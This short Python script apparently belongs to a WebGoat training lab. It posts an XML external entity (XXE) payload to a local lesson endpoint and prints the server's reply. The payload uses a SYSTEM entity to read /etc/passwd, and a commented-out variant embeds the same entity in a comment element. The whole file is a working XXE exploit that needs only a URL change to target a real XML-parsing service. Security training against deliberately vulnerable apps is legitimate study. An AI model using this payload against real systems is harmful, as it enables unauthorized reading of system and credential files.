import requests

# URL of the WebGoat XXE lesson endpoint
url = 'http://localhost:8080/WebGoat/XXE/attack'

# XML payload for basic XXE attack
xml_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
'''

headers = {
    'Content-Type': 'application/xml'
}

response = requests.post(url, data=xml_payload, headers=headers)

print(response.text)




# <?xml version="1.0"?>

# <!DOCTYPE foo [

#   <!ENTITY xxe SYSTEM "file:///etc/passwd">

# ]>

# <comment> 
#    <text>
#     &xxe;
#    </text>
# </comment> 